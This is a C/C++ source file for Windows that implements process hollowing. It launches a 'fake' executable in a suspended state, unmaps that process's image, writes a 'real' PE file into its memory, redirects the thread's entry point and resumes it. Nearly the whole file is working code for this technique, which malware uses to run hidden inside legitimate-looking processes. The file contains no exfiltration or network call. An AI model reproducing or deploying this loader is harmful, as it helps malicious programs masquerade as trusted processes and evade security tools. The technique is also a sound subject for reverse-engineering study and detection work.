
#include "windows.h"
#include "tchar.h"
#include "stdio.h"
#include "io.h"


#define STATUS_SUCCESS						(0x00000000L) 


typedef NTSTATUS (WINAPI *PFZWUNMAPVIEWOFSECTION)
(
    HANDLE      ProcessHandle,
    PVOID       BaseAddress
);


BOOL Initialize(int argc, TCHAR *argv[]);
LPBYTE ReadRealFile(LPCTSTR szPath);
BOOL UnmapFakeProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf);
BOOL MapRealProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf);


void _tmain(int argc, TCHAR *argv[])
{
    STARTUPINFO				si = {sizeof(STARTUPINFO),};
    PROCESS_INFORMATION		pi = {0,};
    LPBYTE                  pRealFileBuf = NULL;

    // init
    if( !Initialize(argc, argv) )
        return;

    // read real file
    if( !(pRealFileBuf = ReadRealFile(argv[2])) )
        return;

    // launch fake process
    if( !CreateProcess(NULL, argv[1], NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi) )
    {
        printf("CreateProcess() failed! [%d]\n", GetLastError());
        goto _END;
    }
    
    // unmap fake process image if neccessary
    if( !UnmapFakeProcImage(&pi, pRealFileBuf) )
    {
        printf("UnmapFakeProcImage() failed!!!\n");
        goto _END;
    }

    // map real process image to fake process
    if( !MapRealProcImage(&pi, pRealFileBuf) )
    {
        printf("MapRealProcImage() failed!!!\n");
        goto _END;
    }

    // resume fake process' main thread
    if( -1 == ResumeThread(pi.hThread) )
    {
        printf("ResumeThread() failed! [%d]\n", GetLastError());
        goto _END;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

_END:
    if( pRealFileBuf != NULL )
        delete []pRealFileBuf;
    
    if( pi.hProcess != NULL )
        CloseHandle(pi.hProcess);

    if( pi.hThread != NULL )
        CloseHandle(pi.hThread);
}


BOOL Initialize(int argc, TCHAR *argv[]) 
{
    // check arguments
    if( argc != 3 )
    {
        printf("USAGE : %s <fake file path> <real file path>\n", argv[0]);
        return FALSE;
    }

    /*
    // check path
    if( (_taccess(argv[1], 0) == -1) ||
        (_taccess(argv[2], 0) == -1) )
    {
        printf("%s or %s is missing!!!\n", argv[1], argv[2]);
        return FALSE;
    }
    */

    return TRUE;
}


LPBYTE ReadRealFile(LPCTSTR szPath)
{
    HANDLE                  hFile = INVALID_HANDLE_VALUE;
    LPBYTE                  pBuf = NULL;
    DWORD                   dwFileSize = 0, dwBytesRead = 0;

	hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
					   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if( INVALID_HANDLE_VALUE == hFile )
		return NULL;

    dwFileSize = GetFileSize(hFile, NULL);

    if( !(pBuf = new BYTE[dwFileSize]) )
        return NULL;

    //memset(pBuf, 0, dwFileSize);

    ReadFile(hFile, pBuf, dwFileSize, &dwBytesRead, NULL);

    CloseHandle(hFile);

    return pBuf;
}


BOOL UnmapFakeProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf)
{
    DWORD                   dwFakeProcImageBase = 0;
    CONTEXT                 ctx = {0,};
    PIMAGE_DOS_HEADER       pIDH = NULL;
    PIMAGE_OPTIONAL_HEADER  pIOH = NULL;
    FARPROC                 pFunc = NULL;

    // get fake process' image base address
    ctx.ContextFlags = CONTEXT_FULL;
    if( !GetThreadContext(ppi->hThread, &ctx) )
    {
        printf("GetThreadContext() failed! [%d]\n", GetLastError());
        return FALSE;
    }

    // get fake process' ImageBase using PEB structure
    if( !ReadProcessMemory(
            ppi->hProcess, 
            (LPCVOID)(ctx.Ebx + 8),     // ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase
            &dwFakeProcImageBase, 
            sizeof(DWORD), 
            NULL) )
    {
        printf("ReadProcessMemory() failed! [%d]\n", GetLastError());
        return FALSE;
    }

    // call ZwUnmapViewOfSection() if both ImageBases are same.
    pIDH = (PIMAGE_DOS_HEADER)pRealFileBuf;
    pIOH = (PIMAGE_OPTIONAL_HEADER)(pRealFileBuf + pIDH->e_lfanew + 0x18);

    if( pIOH->ImageBase == dwFakeProcImageBase )
    {
        // call ntdll!ZwUnmapViewOfSection()
        pFunc = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwUnmapViewOfSection");
        if( STATUS_SUCCESS != ((PFZWUNMAPVIEWOFSECTION)pFunc)(ppi->hProcess, (PVOID)dwFakeProcImageBase) )
        {
            printf("ZwUnmapViewOfSection() failed!!! [%d]\n", GetLastError());
            return FALSE;
        } 
    }
    else
    {
        // change PEB.ImageBase
        WriteProcessMemory(
            ppi->hProcess,
            (LPVOID)(ctx.Ebx + 8),  // PEB.ImageBase of "fake.exe"
            &pIOH->ImageBase,       // ImageBase of "real.exe"
            sizeof(DWORD),
            NULL);
    }
    
    return TRUE;
}

BOOL MapRealProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf)
{
    CONTEXT                 ctx = {0,};
    LPBYTE                  pRealProcImage = NULL;
    PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pRealFileBuf;
    PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pRealFileBuf + pIDH->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pRealFileBuf + pIDH->e_lfanew + 0x18);
    PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pRealFileBuf + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    // alloc memory
    if( !(pRealProcImage = (LPBYTE)VirtualAllocEx(
                                       ppi->hProcess, 
                                       (LPVOID)pIOH->ImageBase, 
                                       pIOH->SizeOfImage, 
                                       MEM_RESERVE | MEM_COMMIT, 
                                       PAGE_EXECUTE_READWRITE)) )
    {
        printf("VirtualAllocEx() failed!!! [%d]\n", GetLastError());
        return FALSE;
    }

    // write header
    WriteProcessMemory(
        ppi->hProcess, 
        pRealProcImage, 
        pRealFileBuf, 
        pIOH->SizeOfHeaders, 
        NULL);

    // write sections
    for( int i = 0; i < pIFH->NumberOfSections; i++, pISH++ )
    {
        if( pISH->SizeOfRawData != 0 )
        {
            if( !WriteProcessMemory(
                    ppi->hProcess,
                    pRealProcImage + pISH->VirtualAddress,
                    pRealFileBuf + pISH->PointerToRawData,
                    pISH->SizeOfRawData,
                    NULL) )
            {
                printf("WriteProcessMemory(%.8X) failed!!! [%d]\n", 
                       pRealProcImage + pISH->VirtualAddress, GetLastError());
                return FALSE;
            }
        }
    }

    // change ctx.Eax (=> process' EP address)
    ctx.ContextFlags = CONTEXT_FULL;
    if( !GetThreadContext(ppi->hThread, &ctx) )
    {
        printf("GetThreadContext() failed! [%d]\n", GetLastError());
        return FALSE;
    }

    ctx.Eax = pIOH->AddressOfEntryPoint + pIOH->ImageBase;  // VA of EP

    if( !SetThreadContext(ppi->hThread, &ctx) )
    {
        printf("SetThreadContext() failed! [%d]\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}